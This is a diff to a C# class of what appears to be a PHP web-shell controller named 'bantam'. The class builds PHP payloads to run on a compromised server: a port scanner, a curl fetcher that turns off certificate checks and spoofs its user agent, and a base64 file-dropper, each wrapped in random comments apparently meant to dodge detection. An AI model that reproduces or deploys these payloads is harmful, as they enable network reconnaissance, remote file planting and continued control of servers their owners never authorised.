@@ -298,11 +298,11 @@ namespace bantam.Classes
                      + "@ini_set('max_execution_time', 0);"
                      + portsCode
                      + "foreach ($ports as $port) {"
-                     + "$conn = @fsockopen('" + host + "', $port, $errno, $err, 2);"
-                     + "if (is_resource($conn)) { "
-                     + "$result .= $port . ' ' . getservbyport($port, 'tcp'). '" + rowSeperator + "';"
-                     + "fclose($conn);"
-                     + "}}"
+                        + "$conn = @fsockopen('" + host + "', $port, $errno, $err, 2);"
+                         + "if (is_resource($conn)) { "
+                             + "$result .= $port . ' ' . getservbyport($port, 'tcp'). '" + rowSeperator + "';"
+                             + "fclose($conn);"
+                        + "}}"
                      + "if (empty($result)) { $result = 'None'; }";
             } else {
                 return RandomPHPComment()
@@ -310,13 +310,44 @@ namespace bantam.Classes
                      + "$result = 0;"
                      + portsCode
                      + "foreach ($ports as $port) {"
-                     + "$conn = @fsockopen('" + host + "', $port, $errno, $err, 2);"
-                     + "if (is_resource($conn)) { "
-                     + "$result = 1;"
-                     + "echo $port . ' ' . getservbyport($port, 'tcp'). \"\n\";"
-                     + "fclose($conn);"
-                     + "}}"
+                        + "$conn = @fsockopen('" + host + "', $port, $errno, $err, 2);"
+                        + "if (is_resource($conn)) { "
+                            + "$result = 1;"
+                             + "echo $port . ' ' . getservbyport($port, 'tcp'). \"\n\";"
+                             + "fclose($conn);"
+                        + "}}"
                      + "if (empty($result)) { echo 'None'; }";
+            }
+        }
+
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <param name="url"></param>
+        /// <returns></returns>
+        public static string getBasicCurl(string url, bool encryptResponse)
+        {
+            if (encryptResponse) {
+                return "$curl = curl_init();" +
+                        "curl_setopt_array($curl, array(" +
+                            "CURLOPT_SSL_VERIFYPEER => false," +
+                            "CURLOPT_FOLLOWLOCATION => true," +
+                            "CURLOPT_USERAGENT => '" + WebHelper.g_GlobalDefaultUserAgent  + "'," +
+                            "CURLOPT_RETURNTRANSFER => 1," +
+                            "CURLOPT_URL => '" + url + "'," +
+                        "));" +
+                        "$result = curl_exec($curl);" +
+                        "curl_close($curl);";
+            } else {
+                return "$curl = curl_init();" +
+                        "curl_setopt_array($curl, array(" +
+                            "CURLOPT_SSL_VERIFYPEER => false," +
+                            "CURLOPT_FOLLOWLOCATION => true," +
+                            "CURLOPT_USERAGENT => '" + WebHelper.g_GlobalDefaultUserAgent + "'," +
+                            "CURLOPT_URL => '" + url + "'," +
+                        "));" +
+                        "curl_exec($curl);" +
+                        "curl_close($curl);";
             }
         }
 
@@ -448,6 +479,19 @@ namespace bantam.Classes
         {
             return RandomPHPComment()
                  + "@file_put_contents('" + remoteFileLocation + "', base64_decode('" + b64FileContents + "'), " + flags + ");"
+                 + RandomPHPComment();
+        }
+
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <param name="remoteFileLocation"></param>
+        /// <param name="b64FileContents"></param>
+        /// <returns></returns>
+        public static string WriteFileVar(string fileLocationVar, string b64FileContents, string flags = "0")
+        {
+            return RandomPHPComment()
+                 + "@file_put_contents(" + fileLocationVar  + ", base64_decode('" + b64FileContents + "'), " + flags + ");"
                  + RandomPHPComment();
         }
 
